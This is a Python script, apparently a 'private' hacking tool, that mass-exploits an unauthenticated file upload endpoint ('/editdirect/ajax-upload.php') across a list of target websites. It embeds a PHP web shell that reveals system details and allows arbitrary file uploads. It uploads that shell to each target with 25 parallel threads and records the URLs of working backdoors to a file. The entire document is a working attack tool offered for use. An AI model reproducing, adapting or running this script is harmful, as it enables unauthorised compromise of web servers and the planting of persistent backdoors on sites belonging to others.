# -*- coding: utf-8 -*-
#####################################
# code by h0d3_g4n thanks Dev19Feb  #
#####################################
import requests, re, urllib2, os, sys, codecs, random               
from multiprocessing.dummy import Pool                          
from time import time as timer  
import time
import json                     
from platform import system 
from colorama import Fore                               
from colorama import Style                              
from pprint import pprint                               
from colorama import init
from urlparse import urlparse
import warnings
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
reload(sys)  
sys.setdefaultencoding('utf8')
init(autoreset=True)
##########################################################################################
ktnred = '\033[31m'
ktngreen = '\033[32m'
ktn3yell = '\033[33m'
ktn4blue = '\033[34m'
ktn5purp = '\033[35m'
ktn6blueblue = '\033[36m'
ktn7grey = '\033[37m'
CEND = '\033[0m' 
shell = """ <?php echo 'h0d3_g4nt3ng'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done');        </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
filename = "def.php"
postmyfile = {'files':(filename, shell, 'text/html')}
#####################################
##########################################################################################
try:
        with codecs.open(sys.argv[1], mode='r', encoding='ascii', errors='ignore') as f:
                ooo = f.read().splitlines()
except IndexError:
        print (ktnred + 'USAGE: '+sys.argv[0]+' listsite.txt' + CEND)
        pass
ooo = list((ooo))
##########################################################################################

def bagian2(url):
    try:
        headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        }
        req = requests.post(url  + "/editdirect/ajax-upload.php?act=ajax", headers=headers, files=postmyfile,timeout=15)
        if req.status_code == 200 and 'edirectimg_' in req.text:
            cpp = re.findall('edirectimg_(.*),', req.text)[0]
            print ('Target: ' + url + ' ' +ktn6blueblue+ ':)' +ktngreen + ' File Uploaded' + CEND)
            open('gas.txt', 'a').write(url+'/editdirect/images/edirectimg_'+cpp+'\n')
        else:
            print ('Target: ' + url + ' ' +ktn6blueblue+ ':(' +ktnred + ' Failed' + CEND)
            pass
    except:
        print ('Target: ' + url + ' ' +ktnred + ' EROOR!' + CEND)
        pass
    pass

#####################################
def logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]
    x = ''' h0d3_g4n & Dev19Feb Priv 8 '''

    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)
        pass


logo()

##########################################################################################
def Main():
        try:
                
                start = timer()
                ThreadPool = Pool(25)
                Threads = ThreadPool.map(bagian2, ooo)
                print('TIME TAKE: ' + str(timer() - start) + ' S')
        except:
                pass


if __name__ == '__main__':
        Main()

